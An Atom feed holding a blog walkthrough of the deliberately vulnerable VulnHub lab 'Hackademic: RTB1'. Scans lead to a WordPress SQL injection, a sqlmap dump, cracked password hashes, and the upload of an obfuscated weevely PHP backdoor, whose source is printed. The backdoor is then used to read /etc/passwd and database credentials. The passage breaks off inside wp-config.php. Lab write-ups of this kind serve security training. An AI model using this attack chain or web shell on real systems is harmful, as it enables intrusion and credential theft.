<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Hackademic | 0x41414141]]></title>
  <link href="http://73696e65.github.io/blog/categories/hackademic/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-05-29T14:50:06+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hackademic: RTB1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/"/>
    <updated>2015-05-29T14:32:12+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>

<p>We gained the IP address 192.168.80.146 for our testing target.</p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.146 -sV -p-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-28 17:14 CEST
</span><span class='line'>Nmap scan report for 192.168.80.146
</span><span class='line'>Host is up (0.00032s latency).
</span><span class='line'>Not shown: 65533 filtered ports
</span><span class='line'>PORT   STATE  SERVICE VERSION
</span><span class='line'>22/tcp closed ssh
</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
</span><span class='line'>MAC Address: 00:0C:29:01:8A:4D (VMware)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Service detection performed. Please report any incorrect results at &lt;a href="http://nmap.org/submit/">http://nmap.org/submit/&lt;/a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds</span></code></pre></td></tr></table></div></figure></p>

<p>Nikto output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.80.146&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          192.168.80.146&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    192.168.80.146&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-04-28 17:18:04 (GMT2)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.2.15 (Fedora)&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE&lt;/li>
</span><span class='line'>&lt;li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>7354 requests: 0 error(s) and 7 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>There was SQL injection on the web page, vulnerable wordpress instance:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1&lt;/a>'
</span><span class='line'>SELECT * FROM wp_categories WHERE cat_ID = 1\\&lsquo; LIMIT 1</span></code></pre></td></tr></table></div></figure></p>

<p>This will take longer and it&rsquo;s not necessery to dump everything:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1&lt;/a>&rdquo; &ndash;dump-all</span></code></pre></td></tr></table></div></figure></p>

<p>Some of the output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&ndash;current-user:
</span><span class='line'>current user:    &lsquo;root@localhost&rsquo;
</span><span class='line'>&ndash;current-db:
</span><span class='line'>current database:    &lsquo;wordpress&rsquo;
</span><span class='line'>&ndash;privileges:
</span><span class='line'>[&lt;em>] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:
</span><span class='line'>    privilege: ALTER
</span><span class='line'>    privilege: ALTER ROUTINE
</span><span class='line'>    privilege: CREATE
</span><span class='line'>    privilege: CREATE ROUTINE
</span><span class='line'>    privilege: CREATE TEMPORARY TABLES
</span><span class='line'>    privilege: CREATE USER
</span><span class='line'>    privilege: CREATE VIEW
</span><span class='line'>    privilege: DELETE
</span><span class='line'>    privilege: DROP
</span><span class='line'>    privilege: EVENT
</span><span class='line'>    privilege: EXECUTE
</span><span class='line'>    privilege: FILE
</span><span class='line'>    privilege: INDEX
</span><span class='line'>    privilege: INSERT
</span><span class='line'>    privilege: LOCK TABLES
</span><span class='line'>    privilege: PROCESS
</span><span class='line'>    privilege: REFERENCES
</span><span class='line'>    privilege: RELOAD
</span><span class='line'>    privilege: REPLICATION CLIENT
</span><span class='line'>    privilege: REPLICATION SLAVE
</span><span class='line'>    privilege: SELECT
</span><span class='line'>    privilege: SHOW DATABASES
</span><span class='line'>    privilege: SHOW VIEW
</span><span class='line'>    privilege: SHUTDOWN
</span><span class='line'>    privilege: SUPER
</span><span class='line'>    privilege: TRIGGER
</span><span class='line'>    privilege: UPDATE
</span><span class='line'>&ndash;passwords:
</span><span class='line'>database management system users password hashes:
</span><span class='line'>[&lt;/em>] root [1]:
</span><span class='line'>    password hash: 2eaec110380126d7</span></code></pre></td></tr></table></div></figure></p>

<p>The wordpress could be scanned using wpscan too:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan &lt;a href="http://192.168.80.146/Hackademic_RTB1">http://192.168.80.146/Hackademic_RTB1&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv
</span><span class='line'>ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
</span><span class='line'>1,login,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,&lt;blank>,&lt;blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,&lt;blank>,&lt;blank>
</span><span class='line'>2,login,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,&lt;blank>,&lt;blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,&lt;blank>,&lt;blank>
</span><span class='line'>3,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,&lt;blank>,&lt;blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,&lt;blank>,&lt;blank>
</span><span class='line'>4,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,&lt;blank>,&lt;blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,&lt;blank>,&lt;blank>
</span><span class='line'>5,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,&lt;blank>,&lt;blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,&lt;blank>,&lt;blank>
</span><span class='line'>6,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,&lt;blank>,&lt;blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,&lt;blank>,&lt;blank></span></code></pre></td></tr></table></div></figure></p>

<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>

<p>We crack the hashes:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep &ldquo;^[0-9]+&rdquo; wp_users.csv| awk -F, &lsquo;{print $10 &ldquo;:&rdquo;  $9}&rsquo;  > /tmp/wp_users.john
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john &ndash;format=raw-md5
</span><span class='line'>Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
</span><span class='line'>NickJames:admin
</span><span class='line'>JohnSmith:PUPPIES
</span><span class='line'>GeorgeMiller:q1w2e3
</span><span class='line'>TonyBlack:napoleon
</span><span class='line'>JasonKonnors:maxwell
</span><span class='line'>MaxBucky:kernel
</span><span class='line'>guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
</span><span class='line'>Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure></p>

<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
</span><span class='line'><span class="o">[</span>generate.php<span class="o">]</span> Backdoor file <span class="p">&amp;</span>lsquo<span class="p">;</span>weevely.php<span class="p">&amp;</span>rsquo<span class="p">;</span> created with password <span class="p">&amp;</span>lsquo<span class="p">;</span>1234<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">kali32</span><span class="o">:~/.</span><span class="nx">sqlmap</span><span class="o">/</span><span class="nx">output</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">80.146</span><span class="o">/</span><span class="nx">dump</span><span class="o">/</span><span class="nx">wordpress</span><span class="c1"># cat weevely.php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$duiq</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">sc</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">scssctscrsc_scrsceplscasccsce</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="nv">$lucw</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$udtq</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$foif</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$kvzf</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'><span class="nv">$tkjs</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">v</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">bvavsve6v4v_vdvevcvovdve</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="nv">$nqkm</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">d</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">dcdrdedatded_fudncdtdidodn</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="nv">$itsd</span> <span class="o">=</span> <span class="nv">$nqkm</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$tkjs</span><span class="p">(</span><span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">woh</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$udtq</span><span class="o">.</span><span class="nv">$lucw</span><span class="o">.</span><span class="nv">$kvzf</span><span class="o">.</span><span class="nv">$foif</span><span class="p">)));</span> <span class="nv">$itsd</span><span class="p">();</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We connect using weevely and found out the mysql root password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely &lt;a href="http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php">http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php&lt;/a> 1234&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
</span><span class='line'>&lt;a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP&lt;/a> User:/var/&lt;a href="ftp:/sbin/nologin">ftp:/sbin/nologin&lt;/a>
</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
</span><span class='line'>vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
</span><span class='line'>avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
</span><span class='line'>rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
</span><span class='line'>nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
</span><span class='line'>tcpdump:x:72:72::/:/sbin/nologin
</span><span class='line'>avahi:x:497:492:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
</span><span class='line'>haldaemon:x:68:491:HAL daemon:/:/sbin/nologin
</span><span class='line'>openvpn:x:496:490:OpenVPN:/etc/openvpn:/sbin/nologin
</span><span class='line'>apache:x:48:489:Apache:/var/www:/sbin/nologin
</span><span class='line'>saslauth:x:495:488:&ldquo;Saslauthd user&rdquo;:/var/empty/saslauth:/sbin/nologin
</span><span class='line'>mailnull:x:47:487::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smmsp:x:51:486::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smolt:x:494:485:Smolt:/usr/share/smolt:/sbin/nologin
</span><span class='line'>sshd:x:74:484:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
</span><span class='line'>pulse:x:493:483:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
</span><span class='line'>gdm:x:42:481::/var/lib/gdm:/sbin/nologin
</span><span class='line'>p0wnbox.Team:x:500:500:p0wnbox.Team:/home/p0wnbox.Team:/bin/bash
</span><span class='line'>mysql:x:27:480:MySQL Server:/var/lib/mysql:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">@</span><span class="nx">HackademicRTB1</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="o">/</span><span class="nx">Hackademic_RTB1</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">wp</span><span class="o">-</span><span class="nx">config</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">// &lt;strong&gt; MySQL settings &lt;/strong&gt; //</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_NAME</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wordpress</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// The name of the database</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_USER</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// Your MySQL username</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_PASSWORD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">lz5yedns</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span> <span class="c1">// &amp;hellip;and password</span>
</span><span class='line'><span class="nb">define</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_HOST</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>     <span class="c1">// 99% chance you won&amp;rsquo;t need to change this value&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Change</span> <span class="nx">the</span> <span class="nx">prefix</span> <span class="k">if</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">have</span> <span class="nx">multiple</span> <span class="nx">blogs</span> <span class="nx">in</span> <span class="nx">a</span> <span class="nx">single</span> <span class="nx">database</span><span class="o">.</span>
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">wp</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>   <span class="c1">// example: &amp;lsquo;wp&lt;/em&gt;&amp;rsquo; or &amp;lsquo;b2&amp;rsquo; or &amp;lsquo;mylogin_&amp;rsquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Change</span> <span class="k">this</span> <span class="nx">to</span> <span class="nx">localize</span> <span class="nx">WordPress</span><span class="o">.</span>  <span class="nx">A</span> <span class="nx">corresponding</span> <span class="nx">MO</span> <span class="nb">file</span> <span class="k">for</span> <span class="nx">the</span>
</span><span class='line'><span class="c1">// chosen language must be installed to wp-includes/languages.</span>
</span><span class='line'><span class="c1">// For example, install de.mo to wp-includes/languages and set WPLANG to &amp;lsquo;de&amp;rsquo;</span>
</span><span class='line'><span class="c1">// to enable German language support.</span>
